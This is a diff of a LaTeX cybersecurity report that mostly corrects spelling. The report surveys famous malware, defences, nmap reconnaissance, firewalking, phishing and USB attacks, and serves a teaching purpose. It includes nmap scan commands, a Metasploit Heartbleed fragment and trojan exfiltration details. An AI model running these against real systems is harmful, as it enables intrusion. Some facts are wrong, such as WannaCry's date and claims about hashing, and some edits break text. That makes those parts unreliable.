@@ -11,32 +11,32 @@
 
 \chapter{The Security Landscape}
 \section{The Cat \& Mouse Game}
-Technology is always changing, often to the needs of the growing world. Changes range from potential to aid traditional sectors to common conviniences that are taken for granted everyday.
+Technology is always changing, often to the needs of the growing world. Changes range from potential to aid traditional sectors to common conveniences that are taken for granted everyday.
 Software usually has a purpose, and that purpose is normally pure in nature. Software is there to solve a problem, to make life easier. A problem arises in implementation however, as mistakes can happen.
 The software development process has various stages, the most important of which being testing. Usually testing is conducted in order to identify any potential bugs that might cause issues later.
 The quality and extent to which a given piece of software is tested varies from sample to sample, and sometimes bugs slip through.
 
-Bugs can be minor or disterous in nature, and can lead to major problems for those who use it.
+Bugs can be minor or disastrous in nature, and can lead to major problems for those who use it.
 The solution is usually to send out an update so that a given bug cannot be exploited any further, but this is not a perfect process. There can be reluctance to update, complacency to the maintaining infrastructure or disregard to the issue at hand.
-Once software is out in the wild, it cannot be retrated. Corporate implementations are already built, and can be abused by criminals who take note of the out of date software.
+Once software is out in the wild, it cannot be retracted. Corporate implementations are already built, and can be abused by criminals who take note of the out of date software.
 
-Both issues of a buggy release and slow update responce can essasibated by corporate culture that put strain on the process. Underfunded, unmotivated and untrained workers will struggle to work to their capability and as a result, security can suffer. 
+Both issues of a buggy release and slow update response can exacerbated by corporate culture that put strain on the process. Underfunded, unmotivated and untrained workers will struggle to work to their capability and as a result, security can suffer. 
 Another potential pitfall is mission critical infrastructure. There could be potential issues with implementation, that cannot be fixed easily due to a 24/7 use window. Another issue is legacy reliance; software may work for a certain OS version only, 
-and the new version that is safe could be too expensive or not exist at all. Careful consideration must be give to defence policy, strategy and potential responce in order to stay ahead of the cat and mouse game that is cyber-security.
+and the new version that is safe could be too expensive or not exist at all. Careful consideration must be give to defence policy, strategy and potential response in order to stay ahead of the cat and mouse game that is cyber-security.
 
 
 %references sectors helped, nhs reliance, and programmer stress
 
-\section{Responce Theory}
-Responce in security is just as important as any other layer. No system or person exists is perfect, mistakes will happen eventually. Those msitakes should be managed by proper training, as will be discussed in the evaulation.
-If issues are inevitable, even with a good culture; what is the proper responce? It varies, but typically a good approach would include simualtions planned out ahead of time of what may happen, with best practise as a responce.
-Scenarios are planned out ahead of time in order of likelyhood, preferbly with people dedicted to incident responce. Serperation of duties and planning ahread of time can reduce much of stress and anxiety that can come with cyber attacks or downtime.
+\section{Response Theory}
+Response in security is just as important as any other layer. No system or person exists is perfect, mistakes will happen eventually. Those mistakes should be managed by proper training, as will be discussed in the evaluation.
+If issues are inevitable, even with a good culture; what is the proper response? It varies, but typically a good approach would include simulations planned out ahead of time of what may happen, with best practise as a response.
+Scenarios are planned out ahead of time in order of likelihoods, preferably with people dedicated to incident response. Separation of duties and planning ahead of time can reduce much of stress and anxiety that can come with cyber attacks or downtime.
 
 Some sensible steps include:
 \begin{enumerate}
     \item [$\bullet$] Airgapping of existing infrastructure
     \item [$\bullet$] Checking of logs
-    \item [$\bullet$] Aquisition of audit trails
+    \item [$\bullet$] Acquisition of audit trails
     \item [$\bullet$] Checking of open connections / malware
 \end{enumerate}
 
@@ -72,16 +72,16 @@ The price tag pertains to the huge amount of systems running windows as a base, 
 WannaCry is the most famous form of ransomware, which caused chaos for the National Health Service in 2018. It relied on the eternal blue vulnerability to get into systems, a leaked NSA exploit which abused a fault in how SMB 1.0 shares transmitted over the network.
 Wannacry still works on windows 10, however Eternal Blue was patched. 
 
-The malware itself was defeated using a combination of pathcing and reverse engineering. The malware reached out to specific domains for C2 functionality, however this was a partial design error. 
-The domains were assumed by security comapnies and the kill switch was initiated to stop the spread, until new strains came out. The intention, as with other ransomware was two fold. Infrastructure damage and financil incentive for a promise to restore the encrypted files.
+The malware itself was defeated using a combination of patching and reverse engineering. The malware reached out to specific domains for C2 functionality, however this was a partial design error. 
+The domains were assumed by security companies and the kill switch was initiated to stop the spread, until new strains came out. The intention, as with other ransomware was two fold. Infrastructure damage and financial incentive for a promise to restore the encrypted files.
 
-Other cryptors have made the rounds, including NotPetya which is under suspsion of being a nation state attack deploying against ukraine by Russia. \citep{notPetya} NotPetya is a modified version of the Petya cryptor, with the major difference being that it is destruction orientated, with no option for a decryption process.
+Other cryptors have made the rounds, including NotPetya which is under suspension of being a nation state attack deploying against Ukraine by Russia. \citep{notPetya} NotPetya is a modified version of the Petya cryptor, with the major difference being that it is destruction orientated, with no option for a decryption process.
 The other difference being that while it kept the basic payload with modifications, it also used the Eternal Blue vulnerability to spread, much like Wannacry. The improved version also implemented a modified Mimikatz build which is a security suite for testing Windows based authentication systems. In this case,
 it was used to dynamically harvest administrator credentials out of the host's memory. \citep{NotPetya02}
 
 \subsection{Heartbleed}
 A heartbeat request asks for a open ssl session to be checked of a given length and content. 
-The length was never checked though so it would read from outside the buffer potentially revealing passwords. Thousands of webservers were vulnerable, 
+The length was never checked though so it would read from outside the buffer potentially revealing passwords. Thousands of web servers were vulnerable, 
 including yahoo. A patch was needed to fix this. It resulted in the ability for an attacker to reveal contents stored in memory, such as credentials and other important information.
 
 The attack is simple, as such a metasploit module is available:
@@ -97,7 +97,7 @@ exploit
 
 \subsection{Loveletter}
 Love Letter, also known as ILOVEYOU is a worm that circulated in the year 2000. It was an email based malware that uses a VBS script to hijack Outlook, and send then itself to the contacts book. \citep{Loveletter}
-It can be speculated that this was particully potent due to the culture of the internet at the time, where most people who communicated, did it via email. This means that a typical contact book was full enough for this attack to be effective, while also leveraging
+It can be speculated that this was particularly potent due to the culture of the internet at the time, where most people who communicated, did it via email. This means that a typical contact book was full enough for this attack to be effective, while also leveraging
 the trust element of the hijacked sender.
 
 Contents \citep{Loveletter}:
@@ -108,7 +108,7 @@ Message body:         kindly check the attached LOVELETTER coming from me.
 
 Attached file name:   LOVE-LETTER-FOR-YOU.TXT.vbs
 
-The malware then proceeds to implant itself into the system, and modify the Internet explorer start page to one of foor that hosts a Trojan payload. The Trojan itself is designed to install into registry, just like the stager, and then capture system data to exfiltrate out to the trojan host via email (mailme@super.net.ph). \citep{loveletter}
+The malware then proceeds to implant itself into the system, and modify the Internet explorer start page to one of four that hosts a Trojan payload. The Trojan itself is designed to install into registry, just like the stager, and then capture system data to exfiltrate out to the Trojan host via email (mailme@super.net.ph). \citep{loveletter}
 
 Information stolen includes:
 Hostname
@@ -128,7 +128,7 @@ David discovered that 0x083A (8:<hostname>) can be used to inject arbitrary data
 This field was not validated as it expected a pointer, and when given a NULL value, it reacted unpredictably.  \citep{SQLSlammerStory}
 
 Buffer overflows can lead to binary hijacking if given the right data, in this case a long hostname. This was abused in SQL Slammer that would send single packet malware to port 1434 using some of the code provided by David at a security event.
-This single packet behaviour is called a 'Warhol Worm' and is notable due to the fact it only persists in memory and is a surprising 376 bytes in length. \citep{SQLSlammer} A restart would fix infection, however due to the fact that most of the SQL sercers on the internet of the time was infected by the worm,
+This single packet behaviour is called a 'Warhol Worm' and is notable due to the fact it only persists in memory and is a surprising 376 bytes in length. \citep{SQLSlammer} A restart would fix infection, however due to the fact that most of the SQL servers on the internet of the time was infected by the worm,
 reinfection was likely without patching or firewall rules.
 
 The worm created a massive rise in patching culture due to the large amount of infections, and changed how security was viewed by all involved. \citep{SQLSlammerStory}
@@ -143,7 +143,7 @@ had an army of 600,000 devices \citep{Mirai}. These devices are somewhat weak on
 125000 / 1.8* = 69444 images pushed per second. 
 \end{tcblisting}
 
-\small{* 1.8 = Average 15 Megapixel Jpeg picture \citep{imgAvg}}
+\small{* 1.8 = Average 15 Megapixel JPEG picture \citep{imgAvg}}
 
 The above shows the scale of that kind of throughput in material terms. In reality, data is arbitrary and only serves to crash the systems that are targeted for attack.
 
@@ -157,22 +157,22 @@ Mirai's Traits \citep{Mirai}:
 \end{enumerate}
 
 \subsection{Emotet}
-Emotet is a modern trojan that is spread via email links and attachments. It has had various version, each having improvement over the last. Typical malcious tactics are implemented such as the exploitation of urgency, curiosity and fear among overs. The malware spreads via email with worm behavior, and like Loveletter, it repopulates via contact book abuse. \citep{Emotet}
+Emotet is a modern Trojan that is spread via email links and attachments. It has had various version, each having improvement over the last. Typical malicious tactics are implemented such as the exploitation of urgency, curiosity and fear among overs. The malware spreads via email with worm behavior, and like Loveletter, it repopulates via contact book abuse. \citep{Emotet}
 
-The primary goal of the malware is to gain access to the victim's bank account, often accessed through a web browser. Exploits include macro scripting on document execution and Javascript exploitation. Both methods result in a C2 structure in which the attacker can control the actions of the malware. This includes seemless updating of the malware, exfiltration of data and futher payload deployment. \citep{Emotet}
+The primary goal of the malware is to gain access to the victim's bank account, often accessed through a web browser. Exploits include macro scripting on document execution and JavaScript exploitation. Both methods result in a C2 structure in which the attacker can control the actions of the malware. This includes seamless updating of the malware, exfiltration of data and further payload deployment. \citep{Emotet}
 
 One of the indicators that it is a modern strain of malware (dating back to 2014) is that it has virtual machine detection. \citep{Emotet} The reason why is clear, virtual machines are controlled environments in which malware is often analysed and reverse engineered. VM detection usually comes in the form of a review of the system setup. 
 
 Common indicators include:
 \begin{enumerate}
     \item Shared folders
-    \item Shared dlipboard
+    \item Shared clipboard
     \item Unrealistically low RAM
     \item Fresh desktop environment
     \item VMware device drivers
 \end{enumerate}
 
-Upon network access, it will try to pivot by conducting brute force and wordlist attacks on nearby services. It is clear that by studying modern malware, that tools and techniques that are historic are implemented in new ways, often in combination with other modern malware.
+Upon network access, it will try to pivot by conducting brute force and word list attacks on nearby services. It is clear that by studying modern malware, that tools and techniques that are historic are implemented in new ways, often in combination with other modern malware.
 
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
@@ -181,57 +181,57 @@ Upon network access, it will try to pivot by conducting brute force and wordlist
 %stateful and stateless
 \section{Variation of Defence Systems}
 \subsection{Network Monitoring Capability}
-Monitoring is rather important. Particually in a manual capacity; having the ability to analyze the flow of the network can aid in both troubleshooting and manual anomaly detection. The difference in human congnition to a machine's is massive; A machine will think as you tell it to think,
+Monitoring is rather important. Particularly in a manual capacity; having the ability to analyze the flow of the network can aid in both troubleshooting and manual anomaly detection. The difference in human cognition to a machine's is massive; A machine will think as you tell it to think,
 and will not act dynamically unless you tell it how should learn. Humans on the other hand have excellent learning and analysis potential as is. This means it is important to utilize the human element to further harden a network via manual monitoring. 
 
-There are many ways to do this, perhaps with grafana dashboards which import all the key data metrics into one. Another avenue could be to use wireshark (or a similar implementated program) to check what is happening at a particular time. 
+There are many ways to do this, perhaps with grafana dashboards which import all the key data metrics into one. Another avenue could be to use wireshark (or a similar implemented program) to check what is happening at a particular time. 
 
-For example, if there is suddenly lots of half open TCP or ICMP requests, there may be a DDoS attack. Another reason that a human brain is benefitical is that it has the capacity of content. A flood of HTTPs traffic may look like a DDoS attack, 
-but may actually be a holiday like black friday in which you may expect hightened traffic.
+For example, if there is suddenly lots of half open TCP or ICMP requests, there may be a DDoS attack. Another reason that a human brain is beneficial is that it has the capacity of content. A flood of HTTP traffic may look like a DDoS attack, 
+but may actually be a holiday like black Friday in which you may expect heightened traffic.
 
 \subsection{Firewall Rules}
 A firewall acts as a device between hosts and the internet and filter incoming and outgoing traffic. They can be in hardware and software form.
 
 An ACL is a series of IOS commands that control whether a router forwards or drops packets based on information found in the packet header. They can limit network traffic to increase performance, provide traffic flow control to restrict delivery of routing updates to 
 ensure they are from a known source, and allow us to restrict part of the network from communicating with another part of the network, while allowing another. We can also block based on traffic type, e.g telnet, while allowing email. ACLs can also be used to tag traffic as priority. 
-A VIP pass of sorts. We have inbound and outbound ACLs. Inbound filters packets coming from a specific interface, outbound does the same independant of the inbound interface, there could be multiple. An ACL uses a wildcard mask to select specific groupings to allow or deny access.
+A VIP pass of sorts. We have inbound and outbound ACLs. Inbound filters packets coming from a specific interface, outbound does the same independent of the inbound interface, there could be multiple. An ACL uses a wildcard mask to select specific groupings to allow or deny access.
 
-The above system uses the idea that only the vpn port is open, with everything else requiring local or vpn access. We use firewall rules to block everything else that is on the same device, such as my dns server. Additonal firewall rules could be used internally to stop priv esc 
-but unlikely in a home lan setup. I only allow local devices to even access the public IP other than for the VPN so it is a whitelist, very strong. The firewall is on the same device as the VPN purposely, if the device goes down, the firewall rules do sure, but so does the VPN which eliminates the access anyway.
+The above system uses the idea that only the vpn port is open, with everything else requiring local or vpn access. We use firewall rules to block everything else that is on the same device, such as my dns server. Additonally firewall rules could be used internally to stop priv esc 
+but unlikely in a home LAN setup. I only allow local devices to even access the public IP other than for the VPN so it is a whitelist, very strong. The firewall is on the same device as the VPN purposely, if the device goes down, the firewall rules do sure, but so does the VPN which eliminates the access anyway.
 
 
 \section{Threat Definition}
-It becomes incresingly important in defence to know what the opposition might try. There are an obsurdly large amount of malware out there, and as such; it's quite important to be able to classify them based off their traits.
+It becomes increasingly important in defence to know what the opposition might try. There are an absurdly large amount of malware out there, and as such; it's quite important to be able to classify them based off their traits.
 
 \subsection{Classification of Threats}
 Malicious software, often called 'Malware' is an ever growing problem for system administrators. There are many threats out there now, and as such, it makes sense to have some form of classification process, a discussion of the categories is 
 important. Additionally, it's rather important to understand that the below categories are overarching, and behavior may warrant subcategories. \citep{MalwareClass} 
 
 Firstly, viruses. They act as the term used for all malware as an umbrella term by the general populace.
-They require user interaction to start, often binding to otherwise legit applicaitons to act as a trigger. They are less common these days due to the interaction factor, with only 10\% of malware classifying as a virus. They can be quite difficult to clean up due to their infecting nature. \citep{MalwareClass}
+They require user interaction to start, often binding to otherwise legit applications to act as a trigger. They are less common these days due to the interaction factor, with only 10\% of malware classifying as a virus. They can be quite difficult to clean up due to their infecting nature. \citep{MalwareClass}
 
-Worms act similarly but their main distinguishing difference is that they often don't need user interaction to trigger and will reproduce themselves over a network. Loveletter and SQLSlammer are a fantastic examples of this, showing that the internet's vast connectivity
+Worms act similarly but their main distinguishing difference is that they often don't need user interaction to trigger and will reproduce themselves over a network. Loveletter and SQLSlammer are a fantastic examples of this, showing that the Internet's vast connectivity
 can lead to a worldwide compromise in hours given the right circumstances. \citep{MalwareClass} 
 
 Trojans are by far the most common pick as of writing for a budding computer hacker. They similar to viruses in that they interact with applications, and that they both require some user interaction to start. The differences lie in behaviour before and after infection. 
-They prefer to masquerade as legitimate programs, that upon exection, do something different entirely, or serve a secret purpose to just what the cracked software or emailed document that was inevitably downloaded for. They do not replicate, prefering to create C2 structures with backdoors,
-and employ remote access trojan (RAT) tactics of creating persistance, often in the form of covert screensharing. \citep{virusVsTrojan}
+They prefer to masquerade as legitimate programs, that upon execution, do something different entirely, or serve a secret purpose to just what the cracked software or emailed document that was inevitably downloaded for. They do not replicate, preferring to create C2 structures with backdoors,
+and employ remote access Trojan (RAT) tactics of creating persistence, often in the form of covert screen sharing. \citep{virusVsTrojan}
 
 %Find something to backup RATs
 
 Rootkits are pieces of malware that share similar traits to that of other classifications of malware, they cannot replicate on their own, and employ c2 structures for remote commands and file execution. 
 Their defining trait comes in how they are implanted, and their reach. They tend to burrow rather deep into the system, usually completely hijacking core operating system functions, or even implanting into the BIOS.
-They typically have high levels of access to both software and hardware with even cases of rootkits being found in malformed firmware. They are difficult to detect and harder to get rid of, with people ususally having to either scrap, or deep
+They typically have high levels of access to both software and hardware with even cases of rootkits being found in malformed firmware. They are difficult to detect and harder to get rid of, with people usually having to either scrap, or deep
 wipe hardware. \cite{MalwareClass02} 
 
-You also have malware that is classified based more on the damage caused, rather than the transmission or retransmission methodology. A non extensive list would inlcude adware and spyware. Adware will reach your machine through one of the above mediums
-and infect key parts of the operating system. The goal is to sideload web content into vison, preferbly where they would be expected normally. 
+You also have malware that is classified based more on the damage caused, rather than the transmission or re-transmission methodology. A non extensive list would include adware and spyware. Adware will reach your machine through one of the above mediums
+and infect key parts of the operating system. The goal is to sideload web content into vision, preferably where they would be expected normally. 
 
 Ads are how much of the internet makes money, and as such if a strain of adware can infect many machines, there is a great financial incentive.
-Areas hijacked often are javascript elements, browser toolbars, page redirects and notifications. Not to be confused with malvertising where advertising networks are the infection vector. \citep{MalwareClass} 
+Areas hijacked often are JavaScript elements, browser toolbars, page redirects and notifications. Not to be confused with malvertising where advertising networks are the infection vector. \citep{MalwareClass} 
 
 Secondly, as stated, there is spyware. Much like adware, it will get onto the system in a given way and will then trigger. The trigger in this case is surveillance. This may include sending
-keyinputs, browsing history, webcam streams, mic inputs and even implement RAT behaviour to get a live stream of their desktop. cite{MalwareClass02}  \citep{MalwareClass} 
+key-inputs, browsing history, webcam streams, mic inputs and even implement RAT behaviour to get a live stream of their desktop. cite{MalwareClass02}  \citep{MalwareClass} 
 
 %keyloggers, internet history scrapers etc.. Somewhat linked to RATs
 
@@ -244,36 +244,36 @@ There are many more, some of which will be discussed at relevant parts of the pa
 
 \section{Anomaly Detection}
 \subsection{Machine-Learning}
-Machine learning is a relativly new technology, that aims to reform the programming process. Typically with software engineering, the end algorithm is explicitly laid out; often encompassing every concievable scenario.
-This methodology is easier to implement at a basic level but challenging to scale, and suscepitble to human bias. Machine learning differs in that an environment is given, a dataset assigned and simulations are ran. 
-Tweaks are made on the fly, by both human and the program itself. This can help expose amazing discoveries that a human would struggle to find, along with a system created that can detect and prevent proactivly.
+Machine learning is a relatively new technology, that aims to reform the programming process. Typically with software engineering, the end algorithm is explicitly laid out; often encompassing every conceivable scenario.
+This methodology is easier to implement at a basic level but challenging to scale, and susceptible to human bias. Machine learning differs in that an environment is given, a data-set assigned and simulations are ran. 
+Tweaks are made on the fly, by both human and the program itself. This can help expose amazing discoveries that a human would struggle to find, along with a system created that can detect and prevent proactively.
 \subsubsection{Protocol Adaptation}
 Different protocols work in varying ways. An approach that monitors them in the same capacity is sure to fail, due in large part to the variation of data handling. Defensive systems must be able to identify the protocol,
 be aware of it's legitimate use, as well as signs of tampering. For example, detection systems should not treat a HTTP packet the same as they would ICMP. Their threat potential is quite distinctly different, and as such;
-it is important that part of the learning process is dedicated to finding the normal. Anything that deviates from the "normal" is consiered an anomoly, and can be acted upon in a given set of ways.
+it is important that part of the learning process is dedicated to finding the normal. Anything that deviates from the "normal" is considered an anomaly, and can be acted upon in a given set of ways.
 \subsection{Signature \& Pattern Matching}
 An interesting question could be made. What is considered a threat to a computer? The simplest answer is "something that is predefined". 
 In computer science, a method of validating integrity is to use a process called hashing; a process in which no two pieces of data can return the same value. 
-There are various algorithms out there, some of which are broken like MD5, meaning they can be abused to return the same value for multiple datasets. 
+There are various algorithms out there, some of which are broken like MD5, meaning they can be abused to return the same value for multiple data sets. 
 If data can be represented as a value, then that value can be checked conditionally for a match against a database. This is the fundamental idea behind signature analysis,
 most commonly used in anti-virus technologies, as static analysis.
 
 %reference encryption
 
-\subsection{Behavoural & Dynamic Analysis}
-Polymorphic encryption and malware versioning has historcly shown that static analysis is not enough, it is an important part but cannot stand on it's own. The idea behind dynamic detection is that rather than
-studying the data at rest, analysis is conducted on either the running malware, or a simulated version of it. Ultimatly malware across versions aims to do the same task, albiet in slightly differing ways. If the methodology
+\subsection{Behavioural & Dynamic Analysis}
+Polymorphic encryption and malware versioning has historically shown that static analysis is not enough, it is an important part but cannot stand on it's own. The idea behind dynamic detection is that rather than
+studying the data at rest, analysis is conducted on either the running malware, or a simulated version of it. Ultimately malware across versions aims to do the same task, albeit in slightly differing ways. If the methodology
 can be identified; the malware can be defeated. This requires a much more skilled approach; A comparison of before and after. ProcMon on Windows is excellent for this; it will let you see what registry keys have changed, what files are new and any peculiar processes.
-Machine learning has been leading the charge in this field, as well as automatic siganture matching.
+Machine learning has been leading the charge in this field, as well as automatic signature matching.
 
 %reference studies on this! procmon research too
 
 \subsection{Whitelist vs Blacklist Approach}
 The choice of a white vs black list is one that depends on infrastructure design. Abstractly, it depends on the approach; if their are many unknowns in the system, a blacklist may have to be used. 
-Similarly the inverse is true. Research shows that a whitelist approach is preferntial for security though more specific in implementation. Whitelistng in this sense refers to a predefined set of hosts
+Similarly the inverse is true. Research shows that a whitelist approach is preferential for security though more specific in implementation. Whitelisting in this sense refers to a predefined set of hosts
 that are allowed access to a given device, rather than a "find and block" approach of a blacklist. Whitelisting requires full knowledge of present and future variables in the network, whereas blacklisting
-allows for easier expansion. Blacklisting is more suscepitble to hacking due to the nature of simply altering the threat to bypass checks; something that whitelisting may prevent. Zero day exploit control is 
-highly dependant on systems only having required access, something that when planned properly, can use a whitelist approach. The approach will vary across the network and as such proritization of security 
+allows for easier expansion. Blacklisting is more susceptible to hacking due to the nature of simply altering the threat to bypass checks; something that whitelisting may prevent. Zero day exploit control is 
+highly dependant on systems only having required access, something that when planned properly, can use a whitelist approach. The approach will vary across the network and as such prioritization of security 
 and looseness of security for usability must be considered.
 
 %\todo{move to syn?}
@@ -293,27 +293,27 @@ and looseness of security for usability must be considered.
 
 \chapter{Malware Mechanisms - Entry Vectors \& Profiling}
 \section{Exposure \& Scanning}
-The internet is about freedom of oppotinity, and is why so many companies have succeeded. Services are accessible and convinient. The ability for anyone to access a service is 'double-edged'.
-If anyone is able to access it legitimatly, it allows potential for a threat actor to conduct their processes also. The first prcoess is often enumeration and scanning. Attacks are much more effective when they are meaninful, scoped and targetted.
+The internet is about freedom of opportunity, and is why so many companies have succeeded. Services are accessible and convenient. The ability for anyone to access a service is 'double-edged'.
+If anyone is able to access it legitimately, it allows potential for a threat actor to conduct their processes also. The first process is often enumeration and scanning. Attacks are much more effective when they are meaningful, scoped and targeted.
 A criminal can use information gathered to hone in later attacks for full effect.  
 
 \subsection{NMAP}
-Nmap is an extreamly useful networking application that allows for a great deal of network reconnaissance. It's main use being the mapping out of networks, as the name would suggest.
+NMAP is an extremely useful networking application that allows for a great deal of network reconnaissance. It's main use being the mapping out of networks, as the name would suggest.
 %other tools listed in ToR
 
 \subsubsection{Fingerprinting \& Banner Grabbing}
-A threat actor can learn much from a network, particually if it is widely exposed to the internet. Valuable enumerated data includes: software names and versions, operating system patch numbers, open ports and typical responce.
-Much can be learned based off how software responds. It could respond in a way that is particually unique, allowing for identification. This could be a message, or typical behavior for that piece of software.
-This probing is called banner grabbing and is one of the first steps in any hacking endevour. A typical example is a web server; if a http request is made on port 80, there will likely be a http responce (assuming the port is open).
-That page in such case would be a vector for identification, with the web server also having poptential for version disclosure with default files. Another potential way to identify wouold be to use a standard ping function. 
-There is fingerprinting capability built into the variable implementation of the ICMP protocol. Different operating systems have differing ping responce times, which gives away the platform. 
+A threat actor can learn much from a network, particularly if it is widely exposed to the internet. Valuable enumerated data includes: software names and versions, operating system patch numbers, open ports and typical response.
+Much can be learned based off how software responds. It could respond in a way that is particularly unique, allowing for identification. This could be a message, or typical behavior for that piece of software.
+This probing is called banner grabbing and is one of the first steps in any hacking endeavour. A typical example is a web server; if a HTTP request is made on port 80, there will likely be a HTTP response (assuming the port is open).
+That page in such case would be a vector for identification, with the web server also having potential for version disclosure with default files. Another potential way to identify would be to use a standard ping function. 
+There is fingerprinting capability built into the variable implementation of the ICMP protocol. Different operating systems have differing ping response times, which gives away the platform. 
 This is impactful as OS version and architecture disclosure means exploits are filtered down to those more likely to work.
 
 These are trivial examples, but show that exposure can lead to the "hacker mindset" being utilised.
 
 Host Discovery Scan (Subnet Scoped):
 \begin{tcblisting}{listing only}
-    nmap -sn 192.168.1.1-254
+    NMAP -sn 192.168.1.1-254
 \end{tcblisting}
 
 Noisy Host Probing Scan:
@@ -325,31 +325,31 @@ nmap -sC -sV -vvv -oA  ~/Documents/nmapscan.txt 192.168.1.50
 %icmp responce time, apache default page w version
 
 \subsection{Firewalking}
-Firewalking a technique of probing a firewall to check what is and isn't allowed. This process operates at layer 4, and means that the respecctive protocols can be interacted with, using conditoinal flags. The most common indentifiers are IP, MAC, subnet, port and VLAN.
-It is achieved by creating a layer 4 packet that has a TimeToLive value 1 higher than the gateway. The packet will attempt to pass through the firewall, and will return ICMP_TIME_EXCEEDED if passed succesfully, otherwise the packet was likely dropped. Firewalk is the tool native
+Firewalking a technique of probing a firewall to check what is and isn't allowed. This process operates at layer 4, and means that the respective protocols can be interacted with, using conditional flags. The most common identifiers are IP, MAC, Subnet, port and VLAN.
+It is achieved by creating a layer 4 packet that has a TimeToLive value 1 higher than the gateway. The packet will attempt to pass through the firewall, and will return ICMP_TIME_EXCEEDED if passed successfully, otherwise the packet was likely dropped. Firewalk is the tool native
 to Kali Linux that uses this methodology to help map out the network. \citep{Firewalk}
 
 A potential use case is to see what is and isn't blocked to make an educated guess on where valuable infrastructure is, and to potentially spoof a layer 2 or 3 address to bypass firewall restrictions.
 
-\subsection{Network Pivotting}
-One of the most potent traits of malware (particually worms) is their ability to spread rappidly. Once malware has a foothold in a network, it can take advantage of the networked nature of infrastructure to check what that machine can talk to.
-It can then conduct either manual or automatic network reconnaissance and enumeration, with the hope to find a vulnerable service to exploit. The advantage of hacking multiple machines is that they cna have different levels of security and access, 
+\subsection{Network Pivoting}
+One of the most potent traits of malware (particularly worms) is their ability to spread rapidly. Once malware has a foothold in a network, it can take advantage of the networked nature of infrastructure to check what that machine can talk to.
+It can then conduct either manual or automatic network reconnaissance and enumeration, with the hope to find a vulnerable service to exploit. The advantage of hacking multiple machines is that they can have different levels of security and access, 
 leading to potential privilege escalation. 
 
-The Metasploit Framework has a program called meterpreter which allows you to run modules using the victim system, and push it through by binding to a process. The process binded to depends on the architecture and software security level, but is dangerous
+The Metasploit Framework has a program called meterpreter which allows you to run modules using the victim system, and push it through by binding to a process. The process bound to depends on the architecture and software security level, but is dangerous
 because it means that the tools on the system are fairly irrelevant. 
 
 \subsection{CVEs \& Shodan}
-Exploits are common, and are numerous. There are way too many to know by name or nature. There is a need for a standardised classifcation; this exists in the form of "Common Vulnerabilities and Exposures (CVEs)". A CVE is essential a unique record for a given vulnrability,
-often used in the cybersecuiryt industry for disclosures and reference. Each CVE is registed in the database (can be found at exploit.db) and is given a severity score, known as the CVSS score. Often exploit implentations and proof of concepts are provided with disclosure of a CVE, that sometimes vary.
-There is a culture in the security scene of who can have the most covert and efficent exploit for a given vulnerability. An outside perspective may use the argument that this is harmful to security. While this is true in some circumstances, tools and exploits are able to be created and exploited regardless of legality.
+Exploits are common, and are numerous. There are way too many to know by name or nature. There is a need for a standardised classification; this exists in the form of "Common Vulnerabilities and Exposures (CVEs)". A CVE is essential a unique record for a given vulnerability,
+often used in the cyber-security industry for disclosures and reference. Each CVE is registered in the database (can be found at exploit.db) and is given a severity score, known as the CVSS score. Often exploit implementations and proof of concepts are provided with disclosure of a CVE, that sometimes vary.
+There is a culture in the security scene of who can have the most covert and efficient exploit for a given vulnerability. An outside perspective may use the argument that this is harmful to security. While this is true in some circumstances, tools and exploits are able to be created and exploited regardless of legality.
 The security consensus typically is around pushing security boundaries through testing and not leaving it up to chance. 
 
 %https://www.balbix.com/insights/what-is-a-cve/#:~:text=CVE stands for Common Vulnerabilities and Exposures.
 
-Shodan in conjuction creates a very deadly pair. Shodan is a internet connected device search engine that allows fine tuned filtering.
-Shodan does not explicitly scan, instead reporting back what is already publcially available, even if tricky to find naturally. What forms is a database that 
-tracks operating systems, software and versions of devices all over the world. This can be used in conjuction with a compatiable CVE to potentially compromize a network.
+Shodan in conjunction creates a very deadly pair. Shodan is a internet connected device search engine that allows fine tuned filtering.
+Shodan does not explicitly scan, instead reporting back what is already publicly available, even if tricky to find naturally. What forms is a database that 
+tracks operating systems, software and versions of devices all over the world. This can be used in conjunction with a compatible CVE to potentially compromise a network.
 The inverse is true, it can be an asset to create awareness of exposure and help push security forward as a result.
 
 %reference shodan, discission of leagility of use of tools and stuff 
@@ -365,67 +365,67 @@ There are two main strands of phishing. The kind you are most likely familiar wi
 
 The second being spear phishing which is the same with one main difference. That difference being the scope and scale. A normal phishing attack tends to be widespread, generic and assuming. The spear counterpart prefers to use reconnaissance to tailor make the email into something that fits them. The goal being to exploit some kind of weakness for a higher payoff via privileged users such as CEOs and unsuspecting admins.
 
-Every website uses HTML files in some form. These usually can be replicated with proper CSS that is in public view. This means you can create a site that looks exactly like paypal for example, with the idea of the victim typing their real credentials in, 
-which goes directly to the hacker's server. There are usually entry points to this, a sophisticated one is where "free wifi" is set up, someone connects to it, is sent to a login page that you made where they register and type their credit card info, 
-as if they were the real hotel for example. It can be used in conjuction with DNS phising below to make them indistinguishable at times.
+Every website uses HTML files in some form. These usually can be replicated with proper CSS that is in public view. This means you can create a site that looks exactly like PayPal for example, with the idea of the victim typing their real credentials in, 
+which goes directly to the hacker's server. There are usually entry points to this, a sophisticated one is where "free WiFi" is set up, someone connects to it, is sent to a login page that you made where they register and type their credit card info, 
+as if they were the real hotel for example. It can be used in conjunction with DNS phishing below to make them indistinguishable at times.
 
 Such attack could also be used to distribute malware in a drive-by attack as talked about. The legit site likely would never have such code, but the custom one very much could. This can lead to much greater consequences. The thing that is fairly scary about this is how easy it is to setup a DNS server. You can even do so with a raspberry pi in about 10 mins for example.
 
 A combination of the above could be used here, to hijack a DNS server to point to this, a cloned website, with a different premade template:
 
 Spear phishing is where you send email enmasse to lure people into clicking some form of link or file. They are often non targeted and usually aim to trick the victim with techniques like urgency, trust and fear. The idea of these campaigns are not to trick everyone, 
-in fact as a whole very very few people fall for it. You will get your small minority that it works on, and that's what they rely on. The solution to this is proper email sanitization, with checks of email header tampering, some form of verifcation and file/link whitelists.
+in fact as a whole very very few people fall for it. You will get your small minority that it works on, and that's what they rely on. The solution to this is proper email sanitation, with checks of email header tampering, some form of verification and file/link whitelists.
 
 \subsection{USB Dropping}
-USB devices carry data in a convinient way through flash storage. They are cheap, quiet and very portable. They can be encrypted and are a great asset to productivity. 
+USB devices carry data in a convenient way through flash storage. They are cheap, quiet and very portable. They can be encrypted and are a great asset to productivity. 
 There are however security concerns around a specific use case of them. Some models of USBs allow for firmware altering; altering that allows some tools to configure it to trick
 devices it is plugged into it, that it is a keyboard. 
 
-Keyboards can obviously type, with keyboard input being inherintly trusted. Input is usually dictated by scripting (commonly 'ducky script')
